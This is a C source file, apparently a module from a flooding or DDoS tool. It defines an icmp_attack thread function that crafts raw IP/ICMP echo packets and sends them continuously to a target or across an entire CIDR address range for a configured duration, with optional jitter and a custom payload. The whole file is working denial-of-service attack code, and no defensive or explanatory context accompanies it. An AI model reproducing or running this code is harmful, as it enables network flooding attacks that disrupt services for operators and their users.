#define _GNU_SOURCE

#include "headers/attack_params.h"

void* icmp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) {
        return NULL;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        return NULL;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }

    const size_t ip_size = sizeof(struct iphdr);
    const size_t icmp_size = sizeof(struct icmphdr);
    size_t base_size = params->psize > 0 ? (size_t)params->psize : 56;
    if (base_size > 1450) base_size = 1450;
    size_t packet_size = ip_size + icmp_size + (base_size > icmp_size ? base_size - icmp_size : 0);
    unsigned char packet[1450];
    memset(packet, 0, sizeof(packet));
    if (params->msg_len > 0) {
        size_t payload_offset = ip_size + icmp_size;
        size_t max_payload = sizeof(packet) > payload_offset ? sizeof(packet) - payload_offset : 0;
        size_t to_copy = params->msg_len < max_payload ? params->msg_len : max_payload;
        if (to_copy > 0)
            memcpy(packet + payload_offset, params->msg, to_copy);
    }

    struct iphdr *iph = (struct iphdr*)packet;
    struct icmphdr *icmph = (struct icmphdr*)(packet + ip_size);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons((uint16_t)packet_size);
    iph->id = htons(getpid() & 0xFFFF);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;
    iph->check = 0;
    iph->check = generic_checksum(iph, ip_size);

    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->un.echo.id = htons(0x1234);
    icmph->un.echo.sequence = 0;
    icmph->checksum = 0;

    unsigned char *payload = packet + ip_size + icmp_size;
    size_t payload_size = packet_size - ip_size - icmp_size;
    for (size_t i = 0; i < payload_size; i++) {
        payload[i] = (unsigned char)(i & 0xFF);
    }

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep = usleep_min > 0;
    time_t end_time = time(NULL) + params->duration;
    uint32_t packets_sent = 0;
    if (params->cidr > 0) {
        uint32_t base = ntohl(params->base_ip);
        uint32_t mask = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end = start | (~mask);
        struct sockaddr_in dest_addr = params->target_addr;
        while (params->active && time(NULL) < end_time) {
            if (params->cidr == 32) {
                dest_addr.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_addr.sin_addr.s_addr;
                icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
                icmph->checksum = 0;
                icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);
                iph->check = 0;
                iph->check = generic_checksum(iph, ip_size);
                ssize_t sent = sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                if (sent > 0) packets_sent++;
                if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
            } else if (params->cidr == 31) {
                dest_addr.sin_addr.s_addr = htonl(start);
                iph->daddr = dest_addr.sin_addr.s_addr;
                icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
                icmph->checksum = 0;
                icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);
                iph->check = 0;
                iph->check = generic_checksum(iph, ip_size);
                ssize_t sent = sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                if (sent > 0) packets_sent++;
                dest_addr.sin_addr.s_addr = htonl(end);
                iph->daddr = dest_addr.sin_addr.s_addr;
                icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
                icmph->checksum = 0;
                icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);
                iph->check = 0;
                iph->check = generic_checksum(iph, ip_size);
                sent = sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                if (sent > 0) packets_sent++;
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    dest_addr.sin_addr.s_addr = htonl(ip);
                    iph->daddr = dest_addr.sin_addr.s_addr;
                    icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
                    icmph->checksum = 0;
                    icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);
                    iph->check = 0;
                    iph->check = generic_checksum(iph, ip_size);
                    ssize_t sent = sendto(sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                    if (sent > 0) packets_sent++;
                }
            }
        }
    } else {
        while (params->active && time(NULL) < end_time) {
            icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
            icmph->checksum = 0;
            icmph->checksum = generic_checksum(icmph, icmp_size + payload_size);
            iph->check = 0;
            iph->check = generic_checksum(iph, ip_size);
            ssize_t sent = sendto(sock, packet, packet_size, 0, (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
            if (sent > 0) packets_sent++;
            if (use_usleep) { int delay = usleep_min; if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1); usleep(delay); }
        }
    }
    close(sock);
    return NULL;
}
